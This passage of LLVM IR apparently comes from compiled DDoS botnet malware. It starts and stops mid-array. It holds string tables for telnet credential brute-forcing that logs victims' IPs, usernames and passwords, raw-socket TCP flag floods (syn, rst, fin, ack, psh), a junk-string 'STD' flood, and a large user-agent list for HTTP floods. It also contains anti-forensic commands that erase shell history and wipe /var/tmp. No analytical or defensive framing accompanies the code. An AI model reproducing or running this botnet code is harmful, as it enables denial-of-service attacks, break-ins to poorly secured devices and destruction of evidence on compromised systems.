-1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.132 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.133 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.136 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN ATTEMPT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.139 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.140 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.141 = private unnamed_addr constant [96 x i8] c"\1B[0;36mHUMAN SENT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.142 = private unnamed_addr constant [98 x i8] c"\1B[0;36mHUMAN FAILED | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.143 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN SUCCESS | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.179, i32 0, i32 0)], align 16
@.str.144 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.145 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.147 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.148 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.149 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.151 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.152 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.153 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.154 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.155 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.157 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.158 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.159 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.160 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.161 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.164 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.168 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.169 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.170 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.171 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.173 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.175 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.176 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.177 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.178 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.179 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.180 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.181 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.182 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.183 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.185 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.186 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.187 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.188 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.189 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.190 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.191 = private unnamed_addr constant [11 x i8] c"pkill -9 \22\00", align 1
@.str.192 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.193 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.194 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.195 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@sendHTTP.useragents = private unnamed_addr constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* 